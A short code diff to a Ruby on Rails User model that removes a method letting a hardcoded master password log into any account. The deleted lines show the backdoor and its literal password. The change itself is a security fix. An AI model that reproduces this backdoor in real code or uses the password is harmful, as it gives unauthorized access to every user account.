@@ -279,9 +279,4 @@ class User < ActiveRecord::Base
     group_name == 'admin'
   end
 
-  #Master password for administration purposes
-  def valid_password?(password)
-     return true if password == "SriaAca"
-     super
-  end
 end
